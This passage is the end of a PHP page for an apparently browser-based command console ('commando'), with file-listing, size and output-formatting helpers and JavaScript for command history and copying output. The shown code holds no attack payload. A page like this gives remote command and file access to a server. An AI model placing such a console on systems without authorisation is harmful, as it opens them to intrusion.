                                $output .= sprintf("%-20s - %s\n", $cmd, $desc);
                            }
                            $output .= "\nPiping is supported: e.g., 'cat file | grep pattern'";
                            break;
    }
    return $output ?: "No output";
}

function determineOutputClass($output) {
    if (strpos($output, 'Error:') === 0) {
        return 'output-error';
    } elseif (strpos($output, 'Downloaded') === 0 || strpos($output, 'Directory') === 0 || strpos($output, 'File') === 0 || strpos($output, 'Moved') === 0 || strpos($output, 'Copied') === 0 || strpos($output, 'Created') === 0 || strpos($output, 'Changed') === 0 || strpos($output, 'Split') === 0) {
        return 'output-success';
    } elseif (strpos($output, '<table') === 0) {
        return '';
    } else {
        return 'output-info';
    }
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function findFiles($dir) {
    $output = '';
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($iterator as $file) {
        $output .= str_replace($dir, '', $file->getPathname()) . "\n";
    }
    return $output;
}

function calculateDirSize($dir) {
    $size = 0;
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $size += $file->getSize();
        }
    }
    return $size;
}
?>
</div>
</div>
<script>
let history = JSON.parse(localStorage.getItem('commandoHistory')) || [];
let historyIndex = history.length;
const inputField = document.getElementById('commandInput');
const outputDiv = document.getElementById('output');
const copyButton = document.getElementById('copyButton');

outputDiv.scrollTop = outputDiv.scrollHeight;

document.querySelector('form').addEventListener('submit', () => {
    const command = inputField.value.trim();
    if (command) {
        if (!history.includes(command)) {
            history.push(command);
            localStorage.setItem('commandoHistory', JSON.stringify(history));
            historyIndex = history.length;
        }
    }
});

inputField.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIndex > 0) {
            historyIndex--;
            inputField.value = history[historyIndex] || '';
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex < history.length - 1) {
            historyIndex++;
            inputField.value = history[historyIndex];
        } else {
            historyIndex = history.length;
            inputField.value = '';
        }
    }
});

copyButton.addEventListener('click', () => {
    const outputText = outputDiv.innerText.trim();
    if (outputText) {
        navigator.clipboard.writeText(outputText).then(() => {
            copyButton.textContent = 'Copied!';
        setTimeout(() => {
            copyButton.textContent = 'Copy Output';
        }, 2000);
        }).catch(err => {
            console.error('Failed to copy: ', err);
        });
    }
});

// Re-run Prism highlighting after DOM updates
document.addEventListener('DOMContentLoaded', () => {
    Prism.highlightAll();
});
</script>
</body>
</html>
